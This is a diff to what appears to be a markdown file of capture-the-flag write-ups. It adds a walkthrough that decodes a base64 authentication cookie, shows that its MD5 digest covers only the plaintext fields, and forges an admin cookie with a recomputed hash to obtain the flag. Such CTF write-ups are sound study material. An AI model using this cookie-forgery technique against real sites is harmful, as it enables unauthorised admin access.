@@ -1287,6 +1287,58 @@ Repeater lets you change the flag value from 0 to 1 and resend the request
 
 ![words2](https://user-images.githubusercontent.com/22657154/44016022-8ce510c6-9ed3-11e8-9463-d9cae644376e.png)
 
-## Password reset
-
 ## Security thru obscurity!
+```assembly
+the page tells us we don't have admin access, but we didn't submit any
+credentials yet: how can it tell? a quick look at the headers reveals a cookie
+being set:
+    AUTH=Z3Vlc3QsZjg0ZTVhNjhmMjZkZjc0YSwxNDM5NjYzMzA2LGZhbHNlOjI5MGFmMjUxN2VmMTE4MzcxYzgzZTU4NDAzMTE5YmNk
+    (base64 decoded):
+    AUTH=guest,f84e5a68f26df74a,1439663306,false:290af2517ef118371c83e58403119bcd 
+    
+in the first chunk we can identify a username, a salt, a timestamp and a
+boolean value, while the second chunk (after ':') holds a md5 digest. simply
+replacing the username with 'admin' does us no good, because the digest isn't
+valid anymore; plus the timestamp for the expiration needs to be adjusted if
+we lost more than 5 minutes analyzing what's going on. well then:
+
+    AUTH=admin,f84e5a68f26df74a,1439663606,true
+         ^     ^                ^          ^
+         |     |                |          '+- because why not, right?
+         |     |                '+- five more minutes!
+         |     '+- what's this? better leave it as is
+         '+- alrighty
+
+this leaves us with the md5 digest. have no fear, because it's quickly
+
+understood:
+
+    ~ echo -n "guest" | md5sum
+    084e0343a0486ff05530df6c705c8bb4  -                             # nope
+
+    ~ echo -n "guest,f84e5a68f26df74a" | md5sum
+    8b71a1b20e383fbde5a8532291f62c18  -                             # nope
+
+    ~ echo -n "guest,f84e5a68f26df74a,1439663306" | md5sum
+    77ef8554cf9299526e2221050ad28694  -                             # nope
+
+    ~ echo -n "guest,f84e5a68f26df74a,1439663306,false" | md5sum
+    290af2517ef118371c83e58403119bcd  -                             # yep
+
+knowing that the digest is derived using the first 'chunk' of the cookie as
+
+a message, we can fix our crafted cookie:
+
+    ~ echo -n "admin,f84e5a68f26df74a,1439663606,true" | md5sum
+
+    98d75696270e1954c45d0fd0af3adeb3  -
+    
+    AUTH=admin,f84e5a68f26df74a,1439663606,true:98d75696270e1954c45d0fd0af3adeb3
+
+    (base64 encoded):
+
+    AUTH=YWRtaW4sZjg0ZTVhNjhmMjZkZjc0YSwxNDM5NjYzNjA2LHRydWU6OThkNzU2OTYyNzBlMTk1NGM0NWQwZmQwYWYzYWRlYjM=
+
+and obtain the flag.
+
+```
